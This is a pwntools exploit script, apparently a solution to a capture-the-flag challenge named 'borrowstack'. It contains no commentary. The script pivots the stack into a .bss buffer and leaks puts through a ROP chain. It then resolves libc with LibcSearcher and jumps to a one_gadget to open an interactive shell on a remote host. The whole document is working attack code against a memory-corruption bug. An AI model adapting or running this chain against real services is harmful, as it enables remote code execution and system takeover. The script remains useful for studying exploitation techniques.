from pwn import*
from LibcSearcher import*
p = process('./borrowstack')
p = remote('123.56.85.29',3635)
elf = ELF('./borrowstack')
puts_got = elf.got['puts']
pop_rdi_ret = 0x400703
leave_ret = 0x400699
bank = 0x601080
context.log_level = 'debug'
payload = '\x00'*0x60 + p64(bank-8 + +0x50) + p64(leave_ret)
p.send(payload)
#---------
payload = '\x00'*0x50 + p64(pop_rdi_ret)+p64(puts_got)+p64(0x040065B)
p.recvuntil('now!\n')
p.sendline(payload)
puts_addr = u64(p.recv(6).ljust(8,'\x00'))
libc = LibcSearcher('puts',puts_addr)
libcbase = puts_addr - libc.dump('puts')
system = libcbase + libc.dump('system')
binsh = libcbase + libc.dump('str_bin_sh')
one_gadget = libcbase + 0xF1147
payload= '\x00'*0x60 + p64(one_gadget)
p.sendline(payload)
p.interactive()
